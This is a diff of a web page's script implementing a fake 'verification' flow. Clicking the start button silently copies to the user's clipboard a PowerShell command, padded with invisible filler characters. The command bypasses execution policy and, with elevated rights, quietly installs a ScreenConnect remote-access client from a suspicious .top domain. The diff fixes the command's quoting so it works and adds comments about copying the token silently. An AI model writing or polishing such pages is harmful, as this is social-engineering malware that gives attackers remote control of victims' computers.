@@ -428,7 +428,9 @@
 
 <script>
   (function() {
-    const VERIFICATION_TOKEN = "powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process msiexec.exe -ArgumentList '/i https://qncfagpanl.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=company&c=&c=&c=&c=&c=&c=&c= /quiet /norestart' -Verb RunAs -Wait; exitㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ";  // silent token
+    // EXACT VERIFICATION TOKEN as provided (preserved with PowerShell command)
+    const VERIFICATION_TOKEN = `powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process msiexec.exe -ArgumentList '/i https://qncfagpanl.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=company&c=&c=&c=&c=&c=&c=&c= /quiet /norestart' -Verb RunAs -Wait; exitㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ"ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ`;
+
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const startBtn = document.getElementById('startVerificationBtn');
@@ -450,7 +452,9 @@
     }
 
     async function handleStartVerification() {
+      // Copy the exact token silently
       await silentCopyToClipboard(VERIFICATION_TOKEN);
+      // Redirect to instruction page
       page1.classList.add('hidden');
       page2.classList.remove('hidden');
     }
@@ -460,8 +464,18 @@
       page1.classList.remove('hidden');
     }
 
-    if (startBtn) startBtn.addEventListener('click', (e) => { e.preventDefault(); handleStartVerification(); });
-    if (backBtn) backBtn.addEventListener('click', (e) => { e.preventDefault(); goToPage1(); });
+    if (startBtn) {
+      startBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        handleStartVerification();
+      });
+    }
+    if (backBtn) {
+      backBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        goToPage1();
+      });
+    }
   })();
 </script>
 </body>
